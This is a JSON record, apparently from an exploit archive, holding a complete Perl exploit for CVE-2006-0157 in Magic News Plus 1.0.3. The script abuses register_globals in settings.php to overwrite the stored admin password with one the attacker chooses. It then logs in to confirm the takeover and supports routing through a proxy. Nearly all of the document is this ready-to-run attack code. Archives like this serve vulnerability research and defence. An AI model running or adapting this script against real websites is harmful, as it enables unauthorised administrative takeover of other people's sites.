{
  "id": "1410",
  "title": "Magic News Plus 1.0.3 - Admin Pass Change",
  "cve": "CVE-2006-0157",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n#\r\n# Magic News Plus <=1.0.3 Admin Pass Change Exploit\r\n#\r\n# Copyright (c) 2006 cijfer <cijfer@netti.fi>\r\n# All rights reserved.\r\n#\r\n# An input validation flaw exists within 'settings.php'\r\n# of Magic News Plus which can lead to the changing of\r\n# the administrative password. Here is where the problem \r\n# is (line 108 of 426):\r\n#\r\n#       ...\r\n# [1]   elseif ($action == \"change\")\r\n#\t       ...\r\n# [2]\t   if ($passwd != $admin_password)\r\n#\t\t       ...\r\n# [3]\t\t   if ($new_passwd != $confirm_passwd)\r\n#       ...\r\n#\r\n# 1. &action=change\r\n# 2. &passwd=<ANYTHING>&admin_password=<AGAIN>\r\n# 3. &new_passwd=<NEW>&confirm_passwd=<AGAIN>\r\n#\r\n# -> register_globals = on\r\n#\r\n# haha, sorry, no cmd execute this time.\r\n#\r\n# $Id: cijfer-mnxpl.pl,v 0.1 2006/01/07 19:24:00 cijfer Exp cijfer $\r\n\r\nuse LWP::UserAgent;\r\nuse Getopt::Long;\r\nuse Term::ANSIColor;\r\n\r\n$port = 80;\r\n$new  = \"cijfer\";\r\n$res  = GetOptions(\"host=s\" => \\$host, \"dir=s\" => \\$dir, \"port=i\" => \\$port, \"tunnel=s\" => \\$tunnel, \"new=s\" => \\$new);\r\n\r\n&usage unless $host and $dir;\r\n&exploit;\r\n\r\nsub usage\r\n{\r\n\tprint \"Magic News Plus <=1.0.3 Admin Pass Change Exploit\\n\";\r\n\tprint \"Usage: $0 -hdn [OPTION]...\\n\\n\";\r\n\tprint \"  -h --host\\thostname or ip of target\\n\";\r\n\tprint \"  -d --dir\\tdirectory without ending slash\\n\";\r\n\tprint \"  -p --port\\tport number (default: 80)\\n\";\r\n\tprint \"  -t --tunnel\\tprovide an HTTP proxy (ex. 0.0.0.0:8080)\\n\";\r\n\tprint \"  -n --new\\tnew admin password you want (default: cijfer)\\n\\n\";\r\n\texit;\r\n}\r\n\r\nsub try\r\n{\r\n\t$cij=LWP::UserAgent->new() or die;\r\n\t$cij->agent(\"Mozilla/5.0 [en] (X11; I; SunOS 5.6 sun4u)\");\r\n\t$cij->proxy(\"http\", \"http://\".$tunnel.\"/\") unless !$tunnel;\r\n\r\n\t$path=\"http://\".$host.$dir.\"/\";\r\n\t$out=$cij->get($path.\"index.php?login=admin&password=\".$new.\"&action=login\");\r\n\r\n\tif($out->is_success)\r\n\t{\r\n\t\tif($out->content =~ /Wrong/)\r\n\t\t{\r\n\t\t\tprint color(\"red\"), \":(\\n\", color(\"reset\");\r\n\t\t\texit;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nsub exploit\r\n{\r\n\t$cij=LWP::UserAgent->new() or die;\r\n\t$cij->agent(\"Mozilla/5.0 [en] (X11; I; SunOS 5.6 sun4u)\");\r\n\t$cij->proxy(\"http\", \"http://\".$tunnel.\"/\") unless !$tunnel;\r\n\r\n\t$string  = \"settings.php?action=change\";\r\n\t$string .= \"&passwd=cijfer\";\r\n\t$string .= \"&admin_password=cijfer\";\r\n\t$string .= \"&new_passwd=\";\r\n\t$string .= $new;\r\n\t$string .= \"&confirm_passwd=\";\r\n\t$string .= $new;\r\n\r\n\t$path=\"http://\".$host.$dir.\"/\";\r\n\t$out=$cij->get($path.$string);\r\n\r\n\tif($out->is_success)\r\n\t{\r\n\t\tprint \"trying username admin and password \".$new.\"...\\n\";\r\n\t\t&try;\r\n\t\tprint \"user: admin, pass: \".$new;\r\n\t\tprint color(\"green\"), \" :)) \", color(\"reset\");\r\n\t\tprint \"-- http://\".$host.$dir.\"\\n\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tprint color(\"red\"), \":(\\n\", color(\"reset\");\r\n\t\texit;\r\n\t}\r\n}\r\n\r\n# milw0rm.com [2006-01-09]",
  "url": "https://www.exploit-db.com/exploits/1410"
}